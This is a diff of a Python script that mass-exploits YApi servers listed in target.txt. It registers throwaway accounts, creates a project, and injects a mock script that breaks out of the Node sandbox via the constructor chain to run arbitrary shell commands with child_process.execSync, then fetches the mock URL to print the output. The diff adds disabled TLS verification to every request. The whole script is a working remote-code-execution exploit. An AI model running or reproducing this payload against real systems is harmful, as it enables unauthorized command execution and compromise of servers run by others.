@@ -4,6 +4,8 @@ import random
 import string
 import uuid
 import os
+import urllib3
+urllib3.disable_warnings()
 
 if(not os.path.exists("target.txt")):
     exit("put url in target.txt! ")
@@ -37,13 +39,13 @@ for url in urls:
             "password":id,
             "username":id
         }
-        reg = requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data))
+        reg = requests.post(url+"/api/user/reg",headers=header,verify=False,timeout=5,data=json.dumps(data))
         print(reg.json())
         if(reg.json()['errcode']==0):
             print("注册成功")
         else:
             continue
-        login = requests.post(url+"/api/user/login",headers=header,timeout=5,data=json.dumps(data))
+        login = requests.post(url+"/api/user/login",headers=header,verify=False,timeout=5,data=json.dumps(data))
 
         print(login.json())
         if(login.json()['errcode']==0):
@@ -51,28 +53,28 @@ for url in urls:
         else:
             continue
         header['Cookie'] = login.headers['Set-Cookie'].split(";")[0]+"; _yapi_uid="+str(login.json()['data']['uid'])
-        #print(requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data)).json())
-        group_id = requests.get(url+"/api/group/list",headers=header,timeout=5).json()['data'][0]['_id']
+        #print(requests.post(url+"/api/user/reg",headers=header,verify=False,timeout=5,data=json.dumps(data)).json())
+        group_id = requests.get(url+"/api/group/list",headers=header,verify=False,timeout=5).json()['data'][0]['_id']
         #print("当前用户组")
         #print(group_id)
         data = {
             "name":id,"group_id":group_id,"icon":"code-o","color":"pink","project_type":"private"
         }
-        projid = requests.post(url+"/api/project/add",headers=header,timeout=5,data=json.dumps(data)).json()['data']['_id']
+        projid = requests.post(url+"/api/project/add",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()['data']['_id']
         #print("当前项目")
         #print(projid)
         data = {
             "id":projid,"project_mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\""+cmd+"\").toString()","is_mock_open":True
         }
-        up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
+        up = requests.post(url+"/api/project/up",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
         #print(up)
-        catid = requests.get(url+"/api/interface/list_menu?project_id="+str(projid),headers=header,timeout=5).json()['data'][0]['_id']
+        catid = requests.get(url+"/api/interface/list_menu?project_id="+str(projid),headers=header,verify=False,timeout=5).json()['data'][0]['_id']
         #print(catid)
         data = {"method":"GET","catid":catid,"title":id,"path":"/"+id,"project_id":projid}
-        api = requests.post(url+"/api/interface/add",headers=header,timeout=5,data=json.dumps(data)).json()
+        api = requests.post(url+"/api/interface/add",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
         #print(api)
         print(url+"/mock/"+str(projid)+"/"+id)
-        print(requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5).text)
+        print(requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5).text)
     except:
         pass
 print(" payload发送完毕 ".center(50,"-"))
